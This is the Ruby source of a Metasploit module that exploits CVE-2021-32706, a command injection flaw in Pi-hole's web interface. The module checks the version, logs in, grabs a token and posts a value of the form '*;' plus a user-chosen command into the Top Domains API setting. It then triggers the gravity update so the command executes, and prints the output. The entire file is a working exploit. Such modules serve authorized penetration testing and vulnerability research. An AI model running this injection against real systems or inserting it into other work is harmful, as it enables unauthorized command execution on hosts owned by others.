##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Pihole

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pi-Hole Top Domains API Authenticated Exec',
        'Description' => %q{
          This exploits a command execution in Pi-Hole Web Interface <= 5.5.
          The Settings > API/Web inetrace page contains the field
          Top Domains/Top Advertisers which is validated by a regex which does not properly
          filter system commands, which can then be executed by calling the gravity
          functionality.  However, the regex only allows a-z, 0-9, _.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'SchneiderSec' # original PoC, discovery
        ],
        'References' => [
          ['URL', 'https://github.com/pi-hole/AdminLTE/security/advisories/GHSA-5cm9-6p3m-v259'],
          ['CVE', '2021-32706']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2021-08-04',
        'Privileged' => true,
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of the Pi-Hole Website', '/']),
        OptString.new('COMMAND', [ true, 'The command to execute. Only 0-9, a-z, _ are allowed.', 'pwd']),
      ]
    )
  end

  def check
    begin
      _version, web_version, _ftl = get_versions

      if web_version.nil?
        print_error("#{peer} - Could not connect to web service - no response or non-200 HTTP code")
        return Exploit::CheckCode::Unknown
      end

      if web_version && Rex::Version.new(web_version) <= Rex::Version.new('5.6')
        vprint_good("Web Interface Version Detected: #{web_version}")
        return Exploit::CheckCode::Appears
      else
        vprint_bad("Web Interface Version Detected: #{web_version}")
        return Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      print_error("#{peer} - Could not connect to the web service")
      return Exploit::CheckCode::Unknown
    end
    Exploit::CheckCode::Safe
  end

  def validate_command
    # https://github.com/pi-hole/AdminLTE/blob/v5.3.1/scripts/pi-hole/php/savesettings.php#L71
    unless /^((\*.)?[_a-z\d](-*[_a-z\d])*)(\.([_a-z\d](-*[a-z\d])*))*(\.([_a-z\d])*)*$/i =~ datastore['COMMAND']
      fail_with(Failure::BadConfig, 'COMMAND invalid. only _, a-z, 0-9 are allowed.')
    end
  end

  def run
    validate_command
    if check != Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
    end

    # check if we need a login
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
      'vars_get' => {
        'tab' => 'api'
      },
      'keep_cookies' => true
    )

    # check if we got hit by a login prompt
    if res && res.body.include?('Sign in to start your session')
      res = login(datastore['PASSWORD'])
      fail_with(Failure::BadConfig, 'Incorrect Password') if res.nil?
    end

    token = get_token('api')

    if token.nil?
      fail_with(Failure::UnexpectedReply, 'Unable to find token')
    end
    print_status("Using token: #{token}")
    print_status('Sending payload request')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
      'vars_get' => {
        'tab' => 'api'
      },
      'vars_post' => {
        'domains' => "*;#{datastore['COMMAND']}",
        'clients' => '',
        'querylog-permitted' => 'on',
        'querylog-blocked' => 'on',
        'field' => 'API',
        'token' => token
      },
      'keep_cookies' => true,
      'method' => 'POST'
    )
    fail_with(Failure::UnexpectedReply, 'Unable to save settings') unless res && res.body.include?('The API settings have been updated')
    res = update_gravity
    fail_with(Failure::UnexpectedReply, 'Unable to update gravity') unless res && res.code == 200
    # first line after our output should be: data:   [i] Neutrino emissions detected...
    output = res.body.split('   [i] ')[0]
    # remove beginning of line with data on it
    output = output.gsub(/^data:/, '')
    # removing last line since its empty
    output = output.split[0..]

    print_good(output.join("\n"))
  end
end
